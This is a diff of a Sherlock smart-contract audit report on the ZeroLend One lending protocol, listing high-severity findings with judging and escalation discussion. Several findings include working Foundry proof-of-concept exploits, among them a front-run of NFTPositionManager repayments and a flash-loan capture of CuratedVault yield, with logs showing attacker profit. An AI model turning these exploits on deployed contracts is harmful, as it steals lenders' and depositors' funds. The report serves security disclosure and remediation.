@@ -1,351 +1,9 @@
-# Issue H-1: `NFTPositionManager`'s lending functions with `params.tokenId = 0` are vulnerable to front-running 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/59 
-
-## Found by 
-000000, A2-security, ZC002, denzi\_, emmac002, iamnmt
-### Summary
-
-`NFTPositionManager`'s lending functions do not take a lending pool as an input parameter will cause the users to interact with a malicious pool when setting `params.tokenId = 0` as an attacker will front-run minting a NFT that linked to a malicious pool and then transfer it to the victim.
-
-### Root Cause
-
-`NFTPositionManager`'s lending functions do not take a lending pool as an input parameter.
-
-Although the protocol mitigated the front-run attack vector by implementing an ownership check in every lending function. We believe these mitigation are not enough for the users to use the lending functions with `params.tokenId = 0` safely
-
-```solidity
-    if (params.tokenId == 0) {
->>    if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();
-      params.tokenId = _nextId - 1;
-    }
-```
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L46-L49
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L66-L69
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L87-L90
-
-https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L107-L110
-
-### Internal pre-conditions
-
-A user uses a `NFTPositionManager` lending function with `params.tokenId = 0`.
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-The attack vector is viable for every `NFTPositionManager`'s lending functions (`suppy`, `withdraw`, `borrow`, `repay`), here we will demonstrate an attack path for the `repay` function.
-
-1. Alice mints a NFT with `id = 1`, she supplies collateral and borrows `1e18 tokenA`.
-2. Alice observes that the last NFT in `NFTPositionManager` is her NFT (the NFT with `id = 1`), so she calls `repay` with `params.tokenId = 0`.
-3. The attacker front-run Alice's repay transaction with:
-   - Creating a malicious pool that has `tokenA` and a worthless token `attackerToken`.
-   - Supplying `1e18 tokenA` directly to the malicious pool.
-   - Minting a NFT with `id = 2`, which linked to the malicious pool.
-   - Using the NFT with `id = 2` to supply `attackerToken` as collateral, and then borrow `1e18 tokenA`.
-   - Tranfering the NFT with `id = 2` to Alice.
-4. Alice's repay transaction is executed. She repaid to the NFT with `id = 2` not the NFT with `id = 1`.
-5. The attacker withdraws `1e18 tokenA` from the malicious pool and benefits `1e18 tokenA` from Alice.
-
-### Impact
-
-The attacker forced the user to interact with a malicious pool. In case of the `repay` function, the attacker stole all the funds that should be paid to the loan from the user.
-
-### PoC
-Run command: `forge test --match-path test/PoC/PoC.t.sol`
-
-```solidity
-// SPDX-License-Identifier: MIT
-pragma solidity 0.8.19;
-
-import {DataTypes} from 'contracts/core/pool/configuration/DataTypes.sol';
-import {IPool} from 'contracts/interfaces/pool/IPool.sol';
-import {INFTPositionManager} from 'contracts/interfaces/INFTPositionManager.sol';
-
-import {IERC20} from '@openzeppelin/contracts/token/ERC20/IERC20.sol';
-import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';
-
-import {Test, console} from '../../lib/forge-std/src/Test.sol';
-import {DeployNFTPositionManager} from 'test/forge/core/positions/DeployNFTPositionManager.t.sol';
-
-contract AttackerToken is ERC20 {
-    constructor() ERC20('XYZ', 'XYZ') {
-        _mint(msg.sender, 100 ether);
-    }
-}
-
-contract PoC is DeployNFTPositionManager {
-    address alice = makeAddr('alice');
-    address attacker = makeAddr('attacker');
-
-    IPool attackerPool;
-    IERC20 attackerToken;
-
-    function setUp() public {
-        _setUpPool();
-        _setup();
-
-        // The attacker created a malicious pool `attackerPool`
-        _setupAttackerPool();
-    }
-
-    function _setupAttackerPool() internal {
-        address[] memory assets = new address[](2);
-        assets[0] = address(tokenA);
-        // The attacker created a malicious token `attackerToken`
-        vm.prank(attacker);
-        attackerToken = new AttackerToken();
-        assets[1] = address(attackerToken);
-
-        address[] memory rateStrategyAddresses = new address[](2);
-        rateStrategyAddresses[0] = address(irStrategy);
-        rateStrategyAddresses[1] = address(irStrategy);
-
-        address[] memory sources = new address[](2);
-        sources[0] = address(oracleA);
-        sources[1] = address(oracleA);
-
-        DataTypes.InitReserveConfig memory config = _basicConfig();
-
-        DataTypes.InitReserveConfig[] memory configurationLocal = new DataTypes.InitReserveConfig[](2);
-        configurationLocal[0] = config;
-        configurationLocal[1] = config;
-
-        address[] memory admins = new address[](1);
-        admins[0] = attacker;
-
-        DataTypes.InitPoolParams memory p = DataTypes.InitPoolParams({
-            proxyAdmin: address(this),
-            revokeProxy: false,
-            admins: admins,
-            emergencyAdmins: new address[](0),
-            riskAdmins: new address[](0),
-            hook: address(0),
-            assets: assets,
-            rateStrategyAddresses: rateStrategyAddresses,
-            sources: sources,
-            configurations: configurationLocal
-        });
-
-        poolFactory.createPool(p);
-        attackerPool = IPool(address(poolFactory.pools(1)));
-    }
-
-    function testPoC() public {
-        DataTypes.ExtraData memory dummyData = DataTypes.ExtraData(bytes(''), bytes(''));
-
-        _mintAndApprove(attacker, tokenA, 1 ether, address(attackerPool));
-        console.log("Attacker tokenA balance before: %e", tokenA.balanceOf(attacker));
-
-        _mintAndApprove(alice, tokenA, 1 ether, address(nftPositionManager));
-
-        // Alice created a NFT with id = 1 to interact with `pool` (this pool is unmalicious)
-        {
-            vm.prank(alice);
-            nftPositionManager.mint(address(pool));
-
-            // Alice borrowed 1e18 tokenA using the NFT with id = 1
-            // For the sake of simplicity, the borrowing code is not implemented
-        }
-
-        // The attacker front-ran Alice's repay transaction
-        {
-            vm.startPrank(attacker);
-            attackerPool.supplySimple(address(tokenA), attacker, 1 ether, 0);
-
-            // The attacker created a NFT position with id = 2
-            nftPositionManager.mint(address(attackerPool));
-
-            // The attacker supplied `attackerToken` to back the borrowing
-            attackerToken.approve(address(nftPositionManager), type(uint256).max);
-            INFTPositionManager.AssetOperationParams memory paramsSupply =
-            INFTPositionManager.AssetOperationParams(address(attackerToken), address(0), 100 ether, 0, dummyData);
-            nftPositionManager.supply(paramsSupply);
-
-            // The attacker borrow tokenA from `attackerPool`
-            INFTPositionManager.AssetOperationParams memory paramsBorrow =
-            INFTPositionManager.AssetOperationParams(address(tokenA), attacker, 1 ether, 0, dummyData);
-            nftPositionManager.borrow(paramsBorrow);
-
-            // The attacker tranfer the NFT with id = 2 to Alice
-            nftPositionManager.transferFrom(attacker, alice, 2);
-            vm.stopPrank();
-        }
-
-        // Alice observed the last NFT is her NFT with id = 1
-        // so she repaid to the NFT with id = 0
-        // Because of the attack, the last NFT is now the NFT with id = 2
-        {
-            INFTPositionManager.AssetOperationParams memory paramsRepay =
-            INFTPositionManager.AssetOperationParams(address(tokenA), address(0), 1 ether, 0, dummyData);
-
-            vm.prank(alice);
-            nftPositionManager.repay(paramsRepay);
-        }
-
-        vm.prank(attacker);
-        attackerPool.withdrawSimple(address(tokenA), attacker, 1 ether, 0);
-        console.log("Attacker tokenA balance after: %e", tokenA.balanceOf(attacker));
-    }
-}
-```
-
-Logs:
-```bash
-  Attacker tokenA balance before: 1e18
-  Attacker tokenA balance after: 2e18
-```
-
-### Mitigation
-
-Add a lending pool to the input parameters of `NFTPositionManager`'s lending functions, add check against this lending pool when `params.tokenId == 0`
-
-```solidity
-    if (params.tokenId == 0) {
-      params.tokenId = _nextId - 1;
-      if (msg.sender != _ownerOf(params.tokenId) || _positions[params.tokenId].pool != params.pool) revert NFTErrorsLib.NotTokenIdOwner();
-    }
-```
-
-
-
-## Discussion
-
-**sherlock-admin3**
-
-1 comment(s) were left on this issue during the judging contest.
-
-**Honour** commented:
->  Invalid: see comment on #024
-
-
-
-**nevillehuang**
-
-I believe this is valid because pool creation is permisionless
-
-# Issue H-2: Incorrect update of borrow & liquidity interest rates when postprocessing a flash loan 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/101 
-
-## Found by 
-000000, 0xAlix2, 0xweebad, A2-security, Tendency, ZC002, coffiasd, dany.armstrong90, denzi\_, dhank, ether\_sky, hyh, iamnmt, lemonmon, stuart\_the\_minion
-### Summary
-
-When postprocessing a flash loan, the `FlashLoanLogic` provides wrong loan fee value to the interest rate strategy as a balance update that will cause highly incorrect calculation of liqiduity & borrow rate values.
-
-### Root Cause
-
-In [FlashLoanLogic.sol:L118](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/FlashLoanLogic.sol#L118) `amountPlusPremium` is wrongly provided instead of `_params.totalPremium`.
-
-```solidity
-  function _handleFlashLoanRepayment(
-    DataTypes.ReserveData storage _reserve,
-    DataTypes.ReserveSupplies storage _totalSupplies,
-    DataTypes.FlashLoanRepaymentParams memory _params
-  ) internal {
-    ... ...
-
-    _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), amountPlusPremium, 0, '', ''); // <-- @audit-issue
-
-    ... ...
-  }
-```
-
-### Internal pre-conditions
-
-- A reserve should have some debt so that the protocol can update the borrow rate.
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-A malicious actor just borrows a flash loan to destabilize the ecosystem of a reserve.
-
-### Impact
-
-After a flash loan, the balance change should be just a flash loan fee but the logic provides the entire loan repay as the balance change to update the interest rates.
-
-Therefore excessively out-of-orbit interest rates will severely disrupt the normal deposit and borrowing operations.
-
-### PoC
-
-I added this test case to `PoolFlashLoanTests.t.sol`.
-```solidity
-  function test_simple_flashloan_underlyingbalance_poc() public {
-    bytes memory emptyParams;
-    MockFlashLoanSimpleReceiver mockFlashSimpleReceiver = new MockFlashLoanSimpleReceiver(pool);
-    _generateFlashloanCondition();
-
-    vm.prank(bob);
-    pool.borrowSimple(address(tokenA), bob, 50 ether, 0);
-
-    poolFactory.setFlashloanPremium(2);
-    uint256 premium = poolFactory.flashLoanPremiumToProtocol();
-    assertEq(premium, 2);
-
-    DataTypes.ReserveSupplies memory reserveSuppliesData = pool.getTotalSupplyRaw(address(tokenA));
-    console.log("underlyingBalance Before flash loan: ", reserveSuppliesData.underlyingBalance);
-    console.log("Actual Balance Before flash loan: ", tokenA.balanceOf(address(pool)), "\n");
-
-    vm.warp(block.timestamp + 1 hours);
-
-    vm.startPrank(alice);
-
-    vm.expectEmit(true, true, true, true);
-    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 1000 ether, (1000 ether * premium) / 10_000);
-    emit Transfer(address(0), address(mockFlashSimpleReceiver), (1000 ether * premium) / 10_000);
-
-    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 1000 ether, emptyParams);
-    vm.stopPrank();
-
-    reserveSuppliesData = pool.getTotalSupplyRaw(address(tokenA));
-    console.log("underlyingBalance After flash loan: ", reserveSuppliesData.underlyingBalance);
-    console.log("Actual Balance After flash loan: ", tokenA.balanceOf(address(pool)), "\n");
-
-    DataTypes.ReserveData memory reserveData = pool.getReserveData(address(tokenA));
-    console.log("Borrow Rate After flash loan: ", reserveData.borrowRate);
-    console.log("Liquidity Rate After flash loan: ", reserveData.liquidityRate);
-  }
-```
-
-Here are the logs after running `forge test --match-test test_simple_flashloan_underlyingbalance_poc -vv`.
-```bash
-Ran 1 test for test/forge/core/pool/PoolFlashLoanTests.t.sol:PoolFlashLoanTests
-[PASS] test_simple_flashloan_underlyingbalance_poc() (gas: 1203761)
-Logs:
-  underlyingBalance Before flash loan:  1950000000000000000000
-  Actual Balance Before flash loan:  1950000000000000000000
-
-  underlyingBalance After flash loan:  2950200000000000000000 // Wrongly exceeded underlyingBalance
-  Actual Balance After flash loan:  1950200000000000000000 
-
-  Borrow Rate After flash loan:  3723033495027083612665660 // The correct value should be 7445322453155295630384002
-  Liquidity Rate After flash loan:  93066569291342618100614 // The correct value should be 372191834611220613848101
-```
-
-### Mitigation
-
-Just replace `amountPlusPremium` with `_params.totalPremium` from the issued line:
-
-```diff
--   _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), amountPlusPremium, 0, '', '');
-+   _reserve.updateInterestRates(_totalSupplies, cache, _params.asset, IPool(_params.pool).getReserveFactor(), _params.totalPremium, 0, '', '');
-```
-
-# Issue H-3: A Reserve Borrow Rate can be significantly decreased after liquidation 
+# Issue H-1: A Reserve Borrow Rate can be significantly decreased after liquidation 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/104 
 
 ## Found by 
-000000, 0xAlix2, 0xc0ffEE, A2-security, BiasedMerc, Honour, JCN, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, ether\_sky, jah, lemonmon, perseus, rilwan99, stuart\_the\_minion, trachev, wellbyt3, zarkk01
+000000, 0xAlix2, 0xc0ffEE, A2-security, BiasedMerc, Honour, JCN, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\_05, almurhasan, dhank, ether\_sky, jah, lemonmon, perseus, rilwan99, stuart\_the\_minion, trachev, wellbyt3, zarkk01
 ## Summary
 
 When performing a liquidation, the borrow rate of the reserve is updated by burnt debt shares instead of the remaining debt shares.
@@ -519,7 +177,7 @@ Should update the `nextDebtShares` with `totalSupplies.debtShares`:
 
 ```
 
-# Issue H-4: Full Liquidation Won't Sweep the Whole Debts With Leaving Some, And Will Wrongly Set Borrowing as False 
+# Issue H-2: Full Liquidation Won't Sweep the Whole Debts With Leaving Some, And Will Wrongly Set Borrowing as False 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107 
 
@@ -772,12 +430,512 @@ Logs:
   TokenB isBorrowing After Liq. false
 ```
 
+
+
+## Discussion
+
+**DemoreXTess**
+
+Escalate
+
+There are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> There are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**Tomiwasa0**
+
+Again i agree with @DemoreXTess , These are two different functions, 
+A fix for A doesn't solve B although the seem similar. 
+Hence 2 different Root cause, similar impact. 
+They should be Duplicated into 
+1. Wrong debt amount
+2. Wrong Collateral amount
+
+**samuraii77**
+
+> Escalate
+> 
+> There are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.
+
+No, it's unfair for watsons who reported both as one if they are split into 2. The issue caused by a single root cause.
+
+**DemoreXTess**
+
+@samuraii77 People who submitted both issues at ones should be the duplicate of both two unique issues. There is nothing wrong about that.
+
+**cvetanovv**
+
+I disagree with the escalation and thought the Lead Judge correctly duplicated them.
+
+The root cause is that the liquidation will be called with wrong values. And those Watsons who correctly judged the root cause would be harmed by a potential separation. 
+
+Planning to reject the escalation and leave the issue as is.
+
+**DemoreXTess**
+
+@cvetanovv I don't understand. What is your argument for your rejection ? Some of watsons will suffer from that or issues are really same ? 
+
+The root cause are completely different. Solving one of those problems doesn't solve the other issue. They are not even in same block scope. 
+
+If the reason of rejection is the reports who mentioned both issues, we should also consider the watsons who submitted both issues in separate. There are 2 different high issues and it reduces the worth of submissions significantly which is far worse in this situation.
+
+**DemoreXTess**
+
+@cvetanovv If you system doesnt support 1 report 2 duplicate system, we can't do anything for them but it is Watson's responsibility to identify which issue is duplicate of another issue. Those issues are definitely different as I stated above.
+
+**cvetanovv**
+
+@DemoreXTess This is not the main reason. 
+
+As I have written, the root cause is that the liquidation will be called with wrong values. 
+
+You can also see my comment on your other similar escalation https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473#issuecomment-2426173895
+
+The same principle is grouped when there are reentrancy vulnerabilities, lack of slippage protection, or unsafe cast. Even if they are different functions and contracts, we duplicate them together.
+
+**DemoreXTess**
+
+@cvetanovv Okay, then my escalations are invalid for both. I didn't know that rule in Sherlock. Thank you for clarification.
+
+**WangSecurity**
+
+Result:
+High
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107/#issuecomment-2391661677): rejected
+
+# Issue H-3: Liquidation can be DOSed due to lack of liquidity on collateral asset reserve 
+
+Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198 
+
+## Found by 
+A2-security, Flashloan44, Obsidian, almurhasan, zarkk01
+### Summary
+
+Lack of liquidity on collateral asset reserves can cause disruption to liquidation. 
+
+### Root Cause
+
+The protocol don't have option to disable borrowing or withdrawing in a particular asset reserve for a certain extent to protect the collateral deposits. It can only [disable borrowing](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L166-L167) or [freeze](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L148-L149) the whole reserves but not for specific portion such as collateral deposits. This can be a big problem because someone can always deduct or empty the reserves either by withdrawing their lended assets or borrowing loan. And when the liquidation comes, the collateral can't be paid to liquidator because the asset reserve is already not enough or emptied.
+
+The pool administrator might suggest designating whole asset reserve to be used only for collateral deposit purposes and not for lending and borrowing. However this can be circumvented by malicious users by transferring their collateral to other reserves that accepts borrowing and lending which can eventually led the collateral to be borrowed. This is the nature of multi-asset lending protocol, it allows multiple asset reserves for borrowing and lending as per protocol documentation.
+
+There could be another suggestion to resolve this by only using one asset reserve per pool that offers lending and borrowing but this will already contradict on what the protocol intends to be which is to be a multi-asset lending pool, meaning there are multiple assets offering lending in single pool.
+
+If the protocol intends to do proper multi-asset lending pool platform, it should protect the collateral assets regarding liquidity issues. 
+
+### Internal pre-conditions
+
+1. Pool creator should setup the pool with more than 2 asset reserves offering lending or borrowing and each of reserves accepts collateral deposits. It allows any of the asset reserves to conduct borrowing to any other asset reserves and vice versa. This is pretty much the purpose and design of the multi-asset lending protocol as per documentation.
+
+
+### External pre-conditions
+
+_No response_
+
+### Attack Path
+
+This can be considered as attack path or can happen also as normal scenario due to the nature or design of the multi-asset lending protocol. Take note the step 6 can be just a normal happening or deliberate attack to disrupt the liquidation.
+
+<img width="579" alt="image" src="https://github.com/user-attachments/assets/3a33a2b1-1e9d-4cc5-8463-8b4a4fcc5f46">
+
+
+
+### Impact
+This should be high risk since in a typical normal scenario, this vulnerability can happen without so much effort.
+The protocol also suffers from bad debt as the loan can't be liquidated.
+
+### PoC
+
+1. Modify this test file /zerolend-one/test/forge/core/pool/PoolLiquidationTests.t.sol
+and insert the following:
+a. in line 16, put address carl = address(3); // add carl as borrower
+b.  modify this function _generateLiquidationCondition() internal {
+    _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA
+    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB
+    _mintAndApprove(carl, tokenB, mintAmountB, address(pool)); // carl 2000 tokenB >>> add this line 
+
+
+    vm.startPrank(alice);
+    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply
+    vm.stopPrank();
+
+    vm.startPrank(bob);
+    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply
+    vm.stopPrank();
+
+    vm.startPrank(carl);
+    pool.supplySimple(address(tokenB), carl, supplyAmountB, 0); // 750 tokenB carl supply >>> add this portion
+    vm.stopPrank();
+
+    vm.startPrank(alice);
+    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow
+    vm.stopPrank();
+
+    assertEq(tokenB.balanceOf(alice), borrowAmountB);
+
+    oracleA.updateAnswer(5e3);
+  }
+  c. Insert this test
+  function testLiquidationSimple2() external {
+    _generateLiquidationCondition();
+    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);
+
+    vm.startPrank(carl);
+    pool.borrowSimple(address(tokenA), carl, borrowAmountB, 0); // 100 tokenA carl borrow to deduct the reserves in which the collateral is deposited
+    vm.stopPrank();
+
+    vm.startPrank(bob);
+    vm.expectRevert();
+    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10 ether); // Bob tries to liquidate Alice but will revert
+
+    vm.stopPrank();
+
+    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);
+
+    // Ensure that no liquidation happened and Alice's debt remains the same
+    assertEq(totalDebtBase, totalDebtBaseNew, "Debt should remain the same after failed liquidation");
+
+  }
+  2. Run the test forge test -vvvv --match-contract PoolLiquidationTest --match-test testLiquidationSimple2
+
+### Mitigation
+
+Each asset reserve should be modified to not allow borrowing or withdrawing for certain collateral deposits. For example, if a particular asset reserve has deposits for collateral, these deposits should not be allowed to be borrowed or withdrew. The rest of the balance of asset reserves will do the lending. At the current design, the pool admin can only make the whole reserve as not enabled for borrowing but not for specific account or amount.
+
+
+
+## Discussion
+
+**sherlock-admin3**
+
+1 comment(s) were left on this issue during the judging contest.
+
+**Honour** commented:
+>  see #147
+
+
+
+**0xspearmint1**
+
+This issue should be high severity, it satisfies Sherlock's [criteria](https://docs.sherlock.xyz/audits/real-time-judging/judging#iv.-how-to-identify-a-high-issue) for high issues
+
+>Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.
+
+The attacker can easily delay the liquidation till bad debt accumulates which will be a >1% loss for the lender 
+
+
+
+
+**Haxatron**
+
+Escalate
+
+Final time to use this 
+
+**sherlock-admin3**
+
+> Escalate
+> 
+> Final time to use this 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+This issue does not qualify as high severity.
+
+The vulnerability arises because the protocol allows collateral to be borrowed, which can lead to temporary liquidation failures due to insufficient liquidity in the pool. 
+
+However, for a user to withdraw all the funds from a pool and cause this scenario, he would need a large amount of capital. Even if they succeed in doing so, the DoS on liquidations is only temporary because the borrower must eventually return the borrowed funds, and they will also incur interest costs.
+
+Planning to reject the escalation and leave the issue as is.
+
+**0xjuaan**
+
+@cvetanovv 
+
+> and they will also incur interest costs
+
+The interest cost will never need to be paid, because the borrow will not be liquidateable.
+
+> he DoS on liquidations is only temporary because the borrower must eventually return the borrowed funds
+
+The DoS on liquidations is not temporary because the borrow will never need to be repaid (because there is no risk of liquidation from accrued interest, because all the collateral is borrowed)
+Even if it was temporary, a DoS of liquidations can be weaponised to lead to bad debt, which is >1% profit for the attacker (at the expense of depositors) since their borrowed funds will be worth more than their collateral provided. 
+
+Based on the above, it is clearly a high severity issue. It has arised due to forking AAVE but not allowing representative aTokens to be seized, as mentioned in #318:
+> This is a known issue that aave have mitigated by allowing liquidators to seize ATokens instead of underlying tokens, when there is not enough liquidity in the pools.
+> To achieve the modularity expected zerolend have tried to simplify the design by removing this core functionality, this however exposes the protocol to the risk of liquidation being blocked if there is not enough liquidity in the pools.
+
+
+
+
+
+**Honour-d-dev**
+
+i agree with @cvetanovv 
+there will always be costs for the attacker, as all assets ltv must be less than 1 so the attacker will have to deposit more in value than they borrow. Combined with their growing interest that, they'll have to either repay the loan + interest to retrieve their initial capital or don't repay and still suffer losses as borrowing is overcollateralized.
+This is a temporary DOS at best.
+
+**0xjuaan**
+
+As I explained, it's a DOS of liquidation which directly leads to bad debt when collateral value keeps dropping, where the attacker's borrowed funds is worth more than their collateral, so they steal funds via this DOS
+
+They don't need to repay and collect their collateral as the debt is worth more (due to bad debt)
+
+
+**cvetanovv**
+
+I will accept the escalation. In theory, a malicious user with very large capital could DoS the liquidation without any constraints, and does not have to return the collateral.
+
+Planning to accept the escalation and make this issue High severity.
+
+**WangSecurity**
+
+Result:
+High
+Has duplicates
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [haxatron](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198/#issuecomment-2394853491): accepted
+
+# Issue H-4: An attacker can hijack the `CuratedVault`'s matured yield 
+
+Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/199 
+
+## Found by 
+0xAlix2, 0xc0ffEE, A2-security, JCN, Obsidian, TessKimy, Varun\_05, dhank, ether\_sky, iamnmt, trachev, zarkk01
+### Summary
+
+`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning will cause the matured yield to be distributed to users that do not supply to the vault before the yield accrues. An attacker can exploit this to hijack the `CuratedVault`'s matured yield.
+
+### Root Cause
+
+`CuratedVault#totalAssets` does not update pool's `liquidityIndex` at the beginning
+
+https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368-L372
+
+```solidity
+  function totalAssets() public view override returns (uint256 assets) {
+    for (uint256 i; i < withdrawQueue.length; ++i) {
+      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
+    }
+  }
+```
+
+### Internal pre-conditions
+
+_No response_
+
+### External pre-conditions
+
+_No response_
+
+### Attack Path
+
+Let's have:
+- A vault has a total assets of `totalAssets`
+- `X` amount of yield is accrued from `T1` to `T2`
+
+1. The attacker takes a flash loan of `flashLoanAmount`
+2. The attacker deposits `flashLoanAmount` at `T2` to the vault. Since `CuratedVault#totalAssets` does not update pool's `liquidityIndex`, the minted shares are calculated based on the total assets at `T1`.
+3. The attacker redeems all the shares and benefits from `X` amount of yield.
+4. The attacker repays the flash loan.
+
+The cost of this attack is gas fee and flash loan fee.
+
+### Impact
+
+The attacker hijacks `flashLoanAmount / (flashLoanAmount + totalAssets)` percentage of `X` amount of yield.
+
+`X` could be a considerable amount when:
+- The pool has high interest rate.
+- `T2 - T1` is large. This is the case for the pool with low interactions.
+
+When `X` is a considerable amount, the amount of hijacked funds could be greater than the cost of the attack, then the attacker will benefit from the attack.
+
+### PoC
+
+Due to a bug in `PositionBalanceConfiguration#getSupplyBalance` that we submitted in a different issue, fix the `getSupplyBalance` function before running the PoC
+
+`core/pool/configuration/PositionBalanceConfiguration.sol`
+
+```diff
+library PositionBalanceConfiguration {
+  function getSupplyBalance(DataTypes.PositionBalance storage self, uint256 index) public view returns (uint256 supply) {
+-   uint256 increase = self.supplyShares.rayMul(index) - self.supplyShares.rayMul(self.lastSupplyLiquidtyIndex);
+-   return self.supplyShares + increase;
++   return self.supplyShares.rayMul(index);
+  }
+}
+```
+
+Run command: `forge test --match-path test/PoC/PoC.t.sol`
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {console} from 'lib/forge-std/src/Test.sol';
+import '../forge/core/vaults/helpers/IntegrationVaultTest.sol';
+
+contract ERC4626Test is IntegrationVaultTest {
+  address attacker = makeAddr('attacker');
+
+  function setUp() public {
+    _setUpVault();
+    _setCap(allMarkets[0], CAP);
+    _sortSupplyQueueIdleLast();
+
+    oracleB.updateRoundTimestamp();
+    oracle.updateRoundTimestamp();
+
+    uint256 vaultAssets = 10 ether;
+
+    loanToken.mint(supplier, vaultAssets);
+    vm.prank(supplier);
+    vault.deposit(vaultAssets, supplier);
+    
+    vm.prank(attacker);
+    loanToken.approve(address(vault), type(uint256).max);
+  }
+
+  function testDeposit() public {
+    collateralToken.mint(borrower, type(uint128).max);
+
+    vm.startPrank(borrower);
+    allMarkets[0].supplySimple(address(collateralToken), borrower, type(uint128).max, 0);
+    allMarkets[0].borrowSimple(address(loanToken), borrower, 8 ether, 0);
+
+    skip(100 days);
+
+    oracleB.updateRoundTimestamp();
+    oracle.updateRoundTimestamp();
+
+    uint256 vaultAssetsBefore = vault.totalAssets();
+
+    console.log("Vault's assets before updating reserve: %e", vaultAssetsBefore);
+
+    uint256 snapshot = vm.snapshot();
+
+    allMarkets[0].forceUpdateReserve(address(loanToken));
+    console.log("Vault's accrued yield: %e", vault.totalAssets() - vaultAssetsBefore);
+
+    vm.revertTo(snapshot);
+
+    uint256 flashLoanAmount = 100 ether;
+
+    loanToken.mint(attacker, flashLoanAmount);
+
+    vm.startPrank(attacker);
+    uint256 shares = vault.deposit(flashLoanAmount, attacker);
+    vault.redeem(shares, attacker, attacker);
+    vm.stopPrank();
+
+    console.log("Attacker's profit: %e", loanToken.balanceOf(attacker) - flashLoanAmount);
+  }
+}
+```
+
+Logs:
+
+```bash
+  Vault's assets before updating reserve: 1e19
+  Vault's accrued yield: 5.62832773326440941e17
+  Attacker's profit: 5.11666157569491763e17
+```
+
+Although the yield accrued, the vault's assets before updating reserve is still `1e19`.
+
+### Mitigation
+
+Update pool's `liquidityIndex` at the beginning of `CuratedVault#totalAssets` 
+
+```diff
+  function totalAssets() public view override returns (uint256 assets) {
+    for (uint256 i; i < withdrawQueue.length; ++i) {
++     withdrawQueue[i].forceUpdateReserve(asset());
+      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);
+    }
+  }
+```
+
+
+
+## Discussion
+
+**DemoreXTess**
+
+Escalate
+
+This should be classified as high severity. Due to the outdated totalAssets, all actions that rely on totalAssets, such as supplying assets, will result in a loss of funds. The minted shares will be incorrect whenever a user supplies assets to the vault. This not only exposes the protocol to flash loan attacks but also causes a direct loss of funds for users. Therefore, the severity of the issue should be high.
+
+**sherlock-admin3**
+
+> Escalate
+> 
